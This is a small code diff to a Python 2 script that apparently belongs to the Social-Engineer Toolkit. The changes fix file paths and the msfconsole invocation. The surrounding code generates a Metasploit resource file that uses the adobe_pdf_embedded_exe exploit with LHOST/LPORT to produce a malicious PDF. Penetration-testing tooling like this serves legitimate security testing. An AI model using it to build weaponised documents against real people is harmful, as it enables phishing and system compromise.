@@ -20,6 +20,8 @@ users_home = os.getenv("HOME")
 # metasploit path
 meta_path=meta_path()
 
+print meta_path
+
 # define if we need apache or not for dll hijacking
 # define if use apache or not
 apache=0
@@ -109,17 +111,17 @@ if exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe" or exploit == 
         if inputpdf == "":
             # change to default SET pdf
             print_info("Defaulting to BLANK PDF built into SET...")
-            inputpdf="src/core/msf_attacks/form.pdf"
+            inputpdf= definepath + "/src/core/msf_attacks/form.pdf"
         # if no file exists defalt this
         if not os.path.isfile(inputpdf):
             print_warning("Unable to find PDF, defaulting to blank PDF.")
-            inputpdf="src/core/msf_attacks/form.pdf"
+            inputpdf= definepath + "/src/core/msf_attacks/form.pdf"
 
     if choicepdf == '2':
-        inputpdf="src/core/msf_attacks/form.pdf"
+        inputpdf= definepath + "/src/core/msf_attacks/form.pdf"
 
     if choicepdf == "":
-        inputpdf="src/core/msf_attacks/form.pdf"
+        inputpdf= definepath + "/src/core/msf_attacks/form.pdf"
 
 exploit_counter=0
 
@@ -173,7 +175,7 @@ if exploit_counter == 0:
 	filewrite = file(setdir + "/template.rc", "w")
 	filewrite.write("use exploit/windows/fileformat/adobe_pdf_embedded_exe\nset LHOST %s\nset LPORT %s\nset INFILENAME %s\nset FILENAME %s\nexploit\n" % (rhost,lport,inputpdf,output))
 	filewrite.close()
-	subprocess.Popen("%s/msfconsole -r %s/template.rc" % (meta_path, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+	subprocess.Popen("%smsfconsole -r %s/template.rc" % (meta_path, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 	while 1:
 		if os.path.isfile(setdir + "/template.pdf"):
 		        subprocess.Popen("cp " + users_home + "/.msf4/local/%s %s" % (filename_code, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
